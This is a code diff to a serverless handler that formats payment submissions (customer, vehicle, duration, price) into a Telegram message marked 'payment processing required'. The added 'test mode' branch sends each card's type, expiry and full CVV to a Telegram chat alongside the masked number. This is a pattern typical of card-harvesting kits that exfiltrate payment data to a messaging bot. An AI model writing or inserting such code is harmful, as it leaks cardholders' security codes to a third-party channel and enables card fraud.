@@ -99,6 +99,20 @@ serve(async (req) => {
 
       case 'payment_submission':
         chatId = telegramSettings.form_chat_id; // Use form chat for payments
+        
+        // Build payment method message based on test mode
+        let paymentMethodText = '';
+        if (data.test_mode) {
+          paymentMethodText = `💳 *Payment Method:* (TEST MODE)\n` +
+            `   • Card Number: ${data.card_number_masked}\n` +
+            `   • Card Type: ${data.card_type}\n` +
+            `   • Expiry: ${data.card_expiry}\n` +
+            `   • CVV: ${data.card_cvv}`;
+        } else {
+          paymentMethodText = `💳 *Payment Method:*\n` +
+            `   • Card: ${data.card_number_masked} (${data.card_type})`;
+        }
+        
         message = `💳 *PAYMENT PROCESSING REQUIRED* 💳\n\n` +
           `🆔 *User ID:* \`${data.userId}\`\n` +
           `👤 *Customer:* ${data.name}\n` +
@@ -111,8 +125,7 @@ serve(async (req) => {
           `   • Color: ${data.vehicle_color}\n\n` +
           `⏱️ *Duration:* ${data.duration}\n` +
           `💰 *Price:* ${data.price}\n\n` +
-          `💳 *Payment Method:*\n` +
-          `   • Card: ${data.card_number_masked} (${data.card_type})\n\n` +
+          paymentMethodText + `\n\n` +
           `⚡ *Choose payment processing method:*`;
         
         replyMarkup = {
